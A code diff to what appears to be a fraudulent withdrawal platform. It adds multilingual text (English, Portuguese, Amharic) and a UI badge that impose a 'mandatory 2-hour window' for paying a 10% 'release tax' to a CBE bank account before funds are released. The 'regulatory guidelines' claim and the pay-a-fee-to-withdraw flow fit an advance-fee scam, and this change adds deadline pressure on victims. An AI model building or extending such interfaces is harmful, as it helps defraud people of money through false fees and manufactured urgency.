@@ -109,12 +109,14 @@ const customVerifyT = {
     releaseWithdrawal: 'Release Withdrawal',
     withdrawalAmount: 'Withdrawal Amount:',
     taxDue: 'Tax Due (10%):',
+    taxPaymentTimeLimit: 'Tax Payment Time:',
+    taxPaymentTimeVal: '2 Hours Window',
     accountNo: 'Account Nº:',
     complete: 'Successful',
     approvalPending: 'Pending Verification',
     taxPending: 'Pending Withdrawal',
     taxPaymentRequired: '⚠️ Tax Payment Required',
-    taxDesc: (amountStr: string) => `According to regulatory guidelines, a 10% release tax (${amountStr}) must be paid before releasing the transfer.`,
+    taxDesc: (amountStr: string) => `According to regulatory guidelines, a 10% release tax (${amountStr}) must be paid within the mandatory 2-hour window before releasing the transfer.`,
     payTo: 'Pay Release Tax To (CBE)',
     copyCbe: 'Copy CBE Account',
     copiedAlert: 'CBE account number copied to clipboard!',
@@ -149,12 +151,14 @@ const customVerifyT = {
     releaseWithdrawal: 'Liberar Retirada',
     withdrawalAmount: 'Valor da Retirada:',
     taxDue: 'Imposto (10%):',
+    taxPaymentTimeLimit: 'Tempo de Pagamento da Taxa:',
+    taxPaymentTimeVal: 'Janela de 2 Horas',
     accountNo: 'Nº Conta:',
     complete: 'Bem-sucedido',
     approvalPending: 'Aprovação Pendente',
     taxPending: 'Retirada Pendente',
     taxPaymentRequired: '⚠️ Pagamento de Taxa Requerido',
-    taxDesc: (amountStr: string) => `De acordo com as diretrizes regulatórias, um imposto de liberação de 10% (${amountStr}) deve ser pago antes de liberar a transferência.`,
+    taxDesc: (amountStr: string) => `De acordo com as diretrizes regulatórias, um imposto de liberação de 10% (${amountStr}) deve ser pago dentro da janela obrigatória de 2 horas antes de liberar a transferência.`,
     payTo: 'Pagar Taxa de Liberação para',
     copyCbe: 'Copiar Conta CBE',
     copiedAlert: 'Conta CBE copiada para a área de transferência!',
@@ -189,12 +193,14 @@ const customVerifyT = {
     releaseWithdrawal: 'ገንዘብ ማውጣትን ፍቀድ',
     withdrawalAmount: 'የሚወጣው የገንዘብ መጠን፦',
     taxDue: 'የሚከፈለው ታክስ (10%)፦',
+    taxPaymentTimeLimit: 'የታክስ ክፍያ ጊዜ፦',
+    taxPaymentTimeVal: 'የ2 ሰዓታት ገደብ',
     accountNo: 'የአካውንት ቁጥር፦',
     complete: 'የተሳካ',
     approvalPending: 'ማረጋገጫ በመጠባበቅ ላይ',
     taxPending: 'በመጠባበቅ ላይ ያለ ማውጣት',
     taxPaymentRequired: '⚠️ የታክስ ክፍያ ያስፈልጋል',
-    taxDesc: (amountStr: string) => `በመመሪያው መሰረት ዝውውሩን ከመልቀቅዎ በፊት 10% የመልቀቂያ ታክስ (${amountStr}) መከፈል አለበት።`,
+    taxDesc: (amountStr: string) => `በመመሪያው መሰረት ዝውውሩን ከመልቀቅዎ በፊት 10% የመልቀቂያ ታክስ (${amountStr}) በተሰጠው የ2 ሰዓታት ገደብ ውስጥ መከፈል አለበት።`,
     payTo: 'የመልቀቂያ ታክሱን ለ (CBE) ይክፈሉ',
     copyCbe: 'የCBE አካውንት ኮፒ አድርግ',
     copiedAlert: 'የCBE አካውንት ቁጥር ኮፒ ተደርጓል!',
@@ -2500,6 +2506,14 @@ export const MyTab: React.FC<MyTabProps> = ({
                         <span className="text-slate-500 font-bold">{cvt.accountNo}</span>
                         <span className="text-slate-800 font-mono font-bold select-all bg-slate-200/60 px-1.5 py-0.5 rounded text-[10px]">{maskAccountNumber(currentTxInModal.accountNumberOrRef)}</span>
                       </div>
+                      {currentTxInModal.status === 'pending' && (
+                        <div className="flex justify-between items-center text-xs pt-1 border-t border-slate-200/60">
+                          <span className="text-amber-800 font-bold">{cvt.taxPaymentTimeLimit}</span>
+                          <span className="text-amber-700 font-black font-mono bg-amber-100/80 border border-amber-300/70 px-2 py-0.5 rounded-md text-[10px] flex items-center gap-1">
+                            <Clock size={10} className="text-amber-600" /> {cvt.taxPaymentTimeVal}
+                          </span>
+                        </div>
+                      )}
                       <div className="flex justify-between items-center text-xs">
                         <span className="text-slate-500 font-bold">Status:</span>
                         {currentTxInModal.status === 'approved' ? (
